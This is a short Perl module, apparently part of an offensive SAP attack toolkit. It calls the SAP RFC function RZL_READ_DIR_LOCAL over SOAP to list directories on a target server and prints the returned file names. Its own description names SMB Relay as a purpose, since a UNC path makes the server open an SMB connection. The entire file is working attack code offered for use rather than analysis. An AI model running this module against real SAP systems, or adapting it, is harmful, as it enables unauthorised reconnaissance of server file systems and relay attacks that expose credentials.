 #!/usr/bin/perl
# Module Directory listing (RZL_READ_DIR_LOCAL)

# CONFIG
######################
my $desc ="Directory listing + SMB Relay (RZL_READ_DIR_LOCAL) \n\t Usage: black.pl .. .. -m id_module <path>  \n\t A path like this: c:\\\n"; 
our $funcName="rzl_dir_list_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub rzl_dir_list_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">
           <FILE_TBL>
             <item>
               <NAME></NAME>
               <SIZE></SIZE>
             </item>
           </FILE_TBL>
           <NAME>%PATH%</NAME>
        </RZL_READ_DIR_LOCAL>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;

	my @answers=send_soap($XML,1);

	my @mass= split (/<item>/, $answers[0]);
	
	foreach $ans_part(@mass){
		if($ans_part=~/<NAME>(.+)<\/NAME>/i){print "$1\n";}		
		}
	
	print "\n\n";
}